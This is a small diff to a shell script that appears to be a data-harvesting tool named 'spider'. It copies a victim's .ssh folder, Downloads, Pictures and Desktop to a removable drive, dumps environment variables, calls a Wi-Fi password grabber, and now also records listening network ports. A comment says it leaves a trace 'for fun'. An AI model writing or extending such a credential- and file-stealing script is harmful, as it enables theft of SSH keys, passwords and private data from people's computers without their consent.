@@ -2,7 +2,7 @@
 source ./lib/helper.sh
 
 # Paths and other vars
-DRIVE_LETTER="E"
+DRIVE_LETTER="D"
 R_HOMEDIR="$DRIVE_LETTER:\\spider\\home_dir" && mkdir $R_HOMEDIR
 SYSTEMINF="$DRIVE_LETTER:\\spider\\system_info" && mkdir $SYSTEMINF
 dirs_in_userdir=(".ssh" "Downloads" "Pictures" "Desktop")
@@ -40,6 +40,8 @@ EOF
   echo "Crawling begun...${LB}";
   echo "Taking environment variables ${LB}"
   printenv > "$SYSTEMINF"\\.env
+  echo "Listening ports ${LB}"
+  netstat -aon | grep "LISTENING" > "$SYSTEMINF"\\.netstat_listen
   wifi_pass
   get_basic_files
   #Leave trace for fun
